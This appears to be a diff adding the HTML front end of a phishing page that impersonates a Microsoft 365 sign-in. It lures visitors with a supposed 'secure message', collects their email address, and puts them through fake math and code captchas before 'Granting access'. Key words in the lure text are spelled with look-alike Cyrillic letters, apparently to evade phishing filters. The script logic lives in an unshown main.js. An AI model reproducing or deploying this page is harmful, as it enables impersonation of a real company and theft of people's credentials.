@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+   <link rel="stylesheet" href="/src/css/style.css" />
+  <link rel="stylesheet" href="/src/css/cookie-banner.css">
+  <title>Sign In Page</title>
+  
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <img src="/src/Microsoft_logo.svg" alt="Microsoft 365" />
+      <span>Microsoft</span>
+    </div>
+    <!-- Step 1: Prompt for Email -->
+    <div id="step1">
+      <p><strong>You've received a ѕесսrе message:</strong></p>
+      <p2>To ассеѕѕ this ѕесսrе message, we'll need to vеrіfy the intended recipient's еmаіl. Please enter the еmаіl address to which this message was ѕһаrеd.</p2>
+      <input type="email" id="email" placeholder="Enter your email" required />
+      <button id="myBtn" onclick="checkEmailDomain()">Continue</button>
+      <p id="domainError" class="error"></p>
+    </div>
+
+    <!-- Step 2: Confirming Email (if domain is valid) -->
+    <div id="step2" class="message">
+      <p>Checking your email address...</p>
+    </div>
+
+    <!-- Step 3: Math Captcha -->
+    <div id="step3" class="message">
+      <p>Please solve this math problem to prove you're not a bot:</p>
+      <p id="mathQuestion"></p>
+      <input type="number" id="mathAnswer" placeholder="Enter your answer" />
+	  <input type="hidden" id="email" name="email" value="">
+      <button id="mathsum" onclick="checkMathAnswer()">Submit</button>
+      <p id="mathError" class="error"></p>
+    </div>
+
+    <!-- Step 4: Character Challenge (10-character code) -->
+    <div id="step4" class="message">
+      <p>Please enter the 10-character code below to confirm you're human:</p>
+      <p id="charChallenge" style="font-weight: bold;"></p>
+      <input type="text" id="charAnswer" placeholder="Enter the 10-character code" maxlength="10" />
+	   <input type="hidden" id="email" name="email" value="">
+      <button id="charCha" onclick="checkCharAnswer()">Submit</button>
+      <p id="charError" class="error"></p>
+    </div>
+
+    <!-- Step 5: Voicemail Playing Animation -->
+    <div id="step5" class="message">
+      <p>Granting access...</p>
+	  
+    </div>
+  </div>
+<!-- Cookie Banner -->
+  <div class="cookie-banner">
+    <div class="cookie-content">
+      <h2>Cookie Policy</h2>
+      <p>Our website enables scripts (e.g. cookies) that can read, store, and write information to your browser and device. The information processed by these scripts includes user data, which may include personal identifiers (e.g. IP address and session details) and browsing history. We use this information for a variety of purposes, such as delivering content, maintaining security, enabling user choice, improving our websites, and for marketing purposes.</p>
+    
+      <div class="cookie-details">
+        <h3>Imprint</h3>
+        <ul>
+          <li>Privacy Policy</li>
+          <li>Strictly necessary</li>
+        </ul>
+      </div>
+      <div class="cookie-buttons">
+        <button id="accept-all" class="cookie-btn">Accept all</button>
+        <button id="reject-all" class="cookie-btn">Reject all</button>
+        <button id="accept-selected" class="cookie-btn">Accept only selected</button>
+      </div>
+    </div>
+  </div>
+ 
+  <script type="module" src="/src/js/cookie-banner.js"></script>
+  <script src="/src/main.js" type="module"></script>
+</body>
+</html>
